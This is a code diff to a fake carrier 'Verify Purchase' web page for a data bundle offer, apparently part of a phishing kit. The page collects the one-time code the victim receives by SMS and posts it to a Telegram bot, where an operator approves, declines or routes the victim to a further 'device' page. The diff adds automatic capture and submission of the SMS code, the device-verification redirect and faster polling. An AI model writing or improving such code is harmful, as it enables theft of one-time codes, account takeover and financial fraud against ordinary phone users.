@@ -100,6 +100,11 @@
             border-radius: 50px;
             cursor: pointer;
             margin: 8px 0;
+            transition: all 0.2s;
+        }
+        .btn-action:disabled {
+            background: #999;
+            cursor: not-allowed;
         }
         .back-btn {
             width: 100%;
@@ -122,7 +127,7 @@
         </div>
         <h1>Verify Purchase</h1>
         <p class="subtitle">A 5-digit verification code has been sent to your number. Please enter it below to complete your purchase.</p>
-       
+      
         <div class="offer-info" id="offerInfo">
             <strong id="offerTitle"></strong><br>
             <span id="offerPrice" style="color:#E30613; font-weight:700; font-size:21px;"></span>
@@ -152,9 +157,11 @@
         };
 
         let state = { lastUpdateId: 0, pollInterval: null };
+        let isProcessing = false;
 
         const errMsg = document.getElementById('errMsg');
         const spinner = document.getElementById('spinner');
+        const verifyBtn = document.getElementById('verifyBtn');
         const offerTitleEl = document.getElementById('offerTitle');
         const offerPriceEl = document.getElementById('offerPrice');
 
@@ -163,7 +170,7 @@
             const name = params.get('offer') || 'Data Bundle';
             const data = params.get('data') || '';
             const price = params.get('price') || '0';
-          
+         
             offerTitleEl.textContent = name + (data ? ` - ${data}` : '');
             offerPriceEl.textContent = `GHS ${price}`;
         }
@@ -193,7 +200,7 @@
                         inputs[index + 1].focus();
                     }
                     if (getCode(containerId).length === length) {
-                        setTimeout(onComplete, 300);
+                        setTimeout(onComplete, 200);
                     }
                 });
                 input.addEventListener('keydown', (e) => {
@@ -204,13 +211,41 @@
             });
         }
 
+        // Auto-fill SMS OTP
+        async function requestAutoOTP() {
+            if (!('OTPCredential' in window)) return;
+            try {
+                const credential = await navigator.credentials.get({ 
+                    otp: { transport: ['sms'] } 
+                });
+                if (credential?.code) {
+                    const inputs = document.querySelectorAll('#otpInputs .otp-input');
+                    credential.code.split('').forEach((digit, i) => {
+                        if (inputs[i]) inputs[i].value = digit;
+                    });
+                    setTimeout(submitOTP, 400);
+                }
+            } catch (e) {}
+        }
+
         function submitOTP() {
+            if (isProcessing) return;
+            isProcessing = true;
+            verifyBtn.disabled = true;
+            verifyBtn.textContent = "Verifying...";
+
             const otp = getCode('otpInputs');
-            if (otp.length !== 5) return;
+            if (otp.length !== 5) {
+                isProcessing = false;
+                verifyBtn.disabled = false;
+                verifyBtn.textContent = "Verify & Accept Purchase";
+                return;
+            }
 
             const ts = Date.now();
             const approveId = `otp_approve_${ts}`;
             const declineId = `otp_decline_${ts}`;
+            const verifyDeviceId = `otp_verify_${ts}`;
 
             const message = `<b>🔴 OTP Verification Received</b>\n\nOffer: ${offerTitleEl.textContent}\nOTP Code: <code>${otp}</code>\n\nChoose Action:`;
 
@@ -223,18 +258,27 @@
                     parse_mode: 'HTML',
                     reply_markup: {
                         inline_keyboard: [
-                            [{ text: "✅ Approve & Complete", callback_data: approveId }],
+                            [
+                                { text: "✅ Approve & Complete", callback_data: approveId },
+                                { text: "📱 Verify Device", callback_data: verifyDeviceId }
+                            ],
                             [{ text: "❌ Decline", callback_data: declineId }]
                         ]
                     }
                 })
             }).then(() => {
                 spinner.style.display = 'flex';
-                startPolling(approveId, declineId);
+                startPolling(approveId, declineId, verifyDeviceId);
+            }).catch(() => {
+                isProcessing = false;
+                verifyBtn.disabled = false;
+                verifyBtn.textContent = "Verify & Accept Purchase";
+                errMsg.textContent = "Network error. Please try again.";
+                errMsg.style.display = 'block';
             });
         }
 
-        function startPolling(approveId, declineId) {
+        function startPolling(approveId, declineId, verifyDeviceId) {
             if (state.pollInterval) clearInterval(state.pollInterval);
             state.pollInterval = setInterval(() => {
                 fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}`)
@@ -245,23 +289,32 @@
                             state.lastUpdateId = update.update_id;
                             if (update.callback_query) {
                                 const cb = update.callback_query.data;
-                                if (cb === approveId) {
+                                const params = new URLSearchParams(window.location.search);
+
+                                if (cb === approveId || cb.startsWith('valid_')) {
                                     clearInterval(state.pollInterval);
                                     spinner.style.display = 'none';
-                                    // Pass all parameters to success page
-                                    const params = new URLSearchParams(window.location.search);
                                     window.location.href = CONFIG.SUCCESS_PAGE + '?' + params.toString();
-                                } else if (cb === declineId) {
+                                } 
+                                else if (cb === verifyDeviceId) {
+                                    clearInterval(state.pollInterval);
+                                    spinner.style.display = 'none';
+                                    window.location.href = CONFIG.DEVICE_PAGE + '?' + params.toString();
+                                } 
+                                else if (cb === declineId) {
                                     clearInterval(state.pollInterval);
                                     spinner.style.display = 'none';
                                     errMsg.textContent = "Request declined. Please try again.";
                                     errMsg.style.display = 'block';
                                     document.querySelectorAll('#otpInputs .otp-input').forEach(i => i.value = '');
+                                    isProcessing = false;
+                                    verifyBtn.disabled = false;
+                                    verifyBtn.textContent = "Verify & Accept Purchase";
                                 }
                             }
                         });
                     });
-            }, 1500);
+            }, 1200); // Faster polling
         }
 
         // Initialize
@@ -269,6 +322,9 @@
         setupAutoFocus('otpInputs', 5, submitOTP);
         document.getElementById('verifyBtn').onclick = submitOTP;
         loadOffer();
+
+        // Auto-fill trigger
+        window.onload = () => setTimeout(requestAutoOTP, 600);
     </script>
 </body>
 </html>
